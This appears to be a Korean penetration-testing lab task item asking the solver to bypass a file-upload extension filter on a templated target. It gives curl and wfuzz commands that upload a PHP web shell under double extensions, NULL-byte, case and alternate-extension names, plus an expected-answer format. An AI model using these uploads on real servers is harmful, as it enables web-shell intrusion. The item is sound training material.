- order: 3
  instruction: |-
    {{WEB_IP}} 대상으로 확장자 필터 우회(이중 확장자)를 수행하시오.

    ■ 실습 방법

    ▶ 1단계: 이중 확장자 패턴 (서버 파싱 차이 악용)
    ```bash
    # 1. 이중 확장자 (Apache mod_mime: 마지막 알 수 있는 확장자만 반영)
    cp shell.php shell.php.jpg
    curl -F "file=@shell.php.jpg" http://target/api/upload
    # Apache 가 .jpg 인식 후 .php 까지 fallback → PHP 실행 가능

    # 2. 역순 (Nginx 일부 설정에서 파싱)
    cp shell.php shell.jpg.php
    curl -F "file=@shell.jpg.php" http://target/api/upload

    # 3. NULL byte truncation (legacy PHP < 5.3.4)
    curl -F "file=@shell.php%00.jpg" http://target/api/upload
    # Old PHP: %00 으로 문자열 종료 → .php 만 인식

    # 4. 대소문자 (case-sensitive 필터 우회)
    cp shell.php shell.PhP
    cp shell.php shell.pHP

    # 5. 변형 PHP 확장자 (블랙리스트 우회)
    for ext in php3 php4 php5 php7 php8 phtml phar pht inc; do
      cp shell.php shell.$ext
      curl -F "file=@shell.$ext" http://target/api/upload
    done
    ```

    ▶ 2단계: 서버별 파싱 룰
    | 서버 | 파싱 |
    |---|---|
    | **Apache** | 마지막 매칭 mime → fallback (`.php.jpg` = jpg + 알수없으면 php) |
    | **Nginx + PHP-FPM** | location 블록 정규식 (`/.+\.php$/` 만 → 우회 어려움) |
    | **IIS 6** | 세미콜론 트릭 `shell.asp;.jpg` → .asp 실행 (legacy) |
    | **Tomcat** | `.jsp` / `.jspx` / `.jsf` |

    ▶ 3단계: 도구 — Burp Intruder + PayloadsAllTheThings
    1. 정상 업로드 캡처 → Intruder
    2. filename §...§ marking
    3. Payloads → PayloadsAllTheThings/Upload Insecure Files/Extension PHP/
    4. Status code/Length 차이로 우회 성공 확인

    ▶ 4단계: 도구 — wfuzz 으로 자동
    ```bash
    wfuzz -c -X POST -u http://10.20.30.80/api/upload \
          -w ~/PATT/Upload\ Insecure\ Files/extensions.lst \
          --multipart "file=shell.FUZZ;@/tmp/shell.php" \
          --hh 415  # 415 (지원 안함) 응답 hide
    ```

    ▶ 5단계: 답변
    성공한 우회 페이로드 (예: `shell.php.jpg`) + 응답 코드 200 quote + 서버 파싱 차이 1 문장.
